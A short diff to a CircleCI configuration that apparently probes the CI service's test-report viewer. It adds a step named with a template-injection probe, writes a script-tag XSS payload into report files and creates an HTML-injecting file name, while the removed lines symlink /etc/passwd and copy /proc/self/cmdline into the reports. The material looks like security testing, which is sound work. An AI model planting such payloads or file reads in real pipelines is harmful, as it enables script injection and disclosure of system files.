@@ -17,9 +17,8 @@ jobs:
       - run:
           name: Pwn{{1-1}}
           command: |
-              echo '<script>alert(document.domain)</script>' > /home/circleci/project/test-reports/text.xml
-              cp /proc/self/cmdline /home/circleci/project/test-reports/
-              ln -s /etc/passwd /home/circleci/project/test-reports/asd.cgi
+              echo '<script>alert(document.domain)</script>' > /home/circleci/project/test-reports/test.svg
+              touch '/home/circleci/project/test-reports/lol<h1>asd'
       - run:
           name: Download Selenium
           command: |
